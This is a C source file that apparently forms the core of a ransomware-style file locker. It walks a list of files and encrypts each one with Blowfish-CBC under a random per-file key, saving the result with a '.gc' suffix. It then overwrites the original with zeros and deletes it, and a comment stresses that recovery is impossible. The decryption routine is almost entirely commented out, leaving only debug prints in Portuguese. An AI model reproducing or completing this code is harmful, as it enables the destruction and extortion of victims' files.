#include"crypto.h"
#include"struct.h"
#include"func.h"
#include"func.h"
#include<stdio.h>
#include<stdlib.h>
#include<openssl/evp.h>
#include<openssl/aes.h>
#define BUF_SIZE 4096
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>


/**
 * This function will walk throught all files on the files(List) and try to open
 * it, if success, generate random key and iv, for each file on the list.
 * Call the encrypt function to encrypt the file.
 * After encryption, the path, key and iv will be added to the encrypted(EncList)
 * If not success opening the file, the path will be added to the not_encrypted
 * (List).
 * @param files -> type = List
 * @param encrypted -> type = EncList
 * @param not_encrypted -> type = List
 */
void encrypt_files(List *files, List **encrypted, List **not_encrypted){
    int status;
    FILE *old, *new;
    char* new_name;
    char *iv;
    char *key;
    while(files != NULL){

        old = fopen(files->info[2], "rb");
        if(old != NULL){
            new_name = (char*) malloc(sizeof(char) * (strlen(files->info[2]) + 6));
            strcpy(new_name, files->info[2]);
            strcat(new_name, ".gc");
            new = fopen(new_name, "wb");

            iv = generate_key(16);
            key = generate_key(32);


            encrypt(old, new, key, iv);
            append(encrypted, new_name, key, iv);
            fclose(new);
            fclose(old);
            free(key);
            free(iv);
            shred(files->info[2]);

        }else    append(not_encrypted, files->info[2], NULL, NULL);

        files = files->prox;
    }
}

/**
 * This function will walk throught all encrypted files on the encrypted(List)
 * and decrypt the files.
 * @param encrypted -> type = EncList
 */
void decrypt_files(List *encrypted){
    int status;
    int tam;
    FILE *old, *new;
    char *new_name;
    char *iv = (char *)malloc(sizeof(char) * 17);
    char *key = (char *)malloc(sizeof(char) * 33);

    while(encrypted != NULL){

        old = fopen(encrypted->info[2], "rb"); // n ta abrindo
        if(old != NULL){
            printf("abriu\n");
            tam = strlen(encrypted->info[2]);
            new_name = (char*) malloc(sizeof(char) * (tam + 6));
            strcpy(new_name, encrypted->info[2]);
            //new_name[tam-3] = '\0';
            free(new_name);
            //new = fopen(new_name, "wb");

            //strcpy(iv, encrypted->info[1]);
            //strcpy(key, encrypted->info[0]);


            //decrypt(old, new, key, iv);
            //memset(iv, 0, 17);
            //memset(key, 0, 33);

            //fclose(new);
            //fclose(old);
            //remove(encrypted->info[2]);

        }else{
            printf("nao abriu \n");
        }

        encrypted = encrypted->prox;
    }
    free(key);
    free(iv);

}

/**
 * This function shred and delete the file.
 * There's no way recovering the old files.
 * @param path -> type = char * (String)
 */
void shred(char *path){
    //get file size
    struct stat stat_buf;
    if (stat(path, &stat_buf) == -1)
        return;
    off_t fsize = stat_buf.st_size;

    int fd = open(path, O_WRONLY);
    if (fd == -1)
        return;

    void *buf = malloc(BUF_SIZE);
    memset(buf, 0, BUF_SIZE);
    ssize_t ret = 0;
    off_t shift = 0;
    while((ret = write(fd, buf,
                       ((fsize - shift >BUF_SIZE)?
                       BUF_SIZE:(fsize - shift)))) > 0)
        shift += ret;

    close(fd);
    free(buf);
    if (ret == -1)
        return;

    remove(path);
}

/**
 * This function will encrypt the content from file and save on the out (FILE).
 * @param in -> type = FILE
 * @param out -> type = FILE
 * @param key -> type = char * (String)
 * @param iv -> type = char * (String)
 */
void encrypt(FILE *in, FILE *out, char *key, char *iv){
    int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), NULL, NULL, NULL, 1); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, NULL, NULL, key, iv, 1);
    while(1){
        inlen = fread(inbuf, 1, chunk_size, in);
        if(inlen <= 0)   break;
        if(!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)){
            /* Error */
            EVP_CIPHER_CTX_cleanup(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }
    if(!EVP_CipherFinal_ex(ctx, outbuf, &outlen))
    {
        /* Error */
        EVP_CIPHER_CTX_cleanup(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);
    EVP_CIPHER_CTX_cleanup(ctx);
    rewind(in);
    rewind(out);
}

/**
 * This function will decrypt the content from encrypted file and save on the
 * out (FILE).
 * @param in -> type = FILE
 * @param out -> type = FILE
 * @param key -> type = char * (String)
 * @param iv -> type = char * (String)
 */
void decrypt(FILE *in, FILE *out, char *key, char *iv){
int chunk_size = 512;
    unsigned char inbuf[chunk_size];
    unsigned char outbuf[chunk_size + EVP_MAX_BLOCK_LENGTH];
    int inlen;
    int outlen;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

    EVP_CIPHER_CTX_init(ctx);
    EVP_CipherInit_ex(ctx, EVP_bf_cbc(), NULL, NULL, NULL, 0); // 1 encrypt - 0 decrypt
    EVP_CIPHER_CTX_set_key_length(ctx, 16);
    EVP_CipherInit_ex(ctx, NULL, NULL, key, iv, 0);
    while(1){
        inlen = fread(inbuf, 1, chunk_size, in);
        if(inlen <= 0)   break;
        if(!EVP_CipherUpdate(ctx, outbuf, &outlen, inbuf, inlen)){
            /* Error */
            EVP_CIPHER_CTX_cleanup(ctx);
            return;
        }
        fwrite(outbuf, 1, outlen, out);
    }
    if(!EVP_CipherFinal_ex(ctx, outbuf, &outlen))
    {
        /* Error */
        EVP_CIPHER_CTX_cleanup(ctx);
        return;
    }
    fwrite(outbuf, 1, outlen, out);
    EVP_CIPHER_CTX_cleanup(ctx);
    rewind(in);
    rewind(out);
}
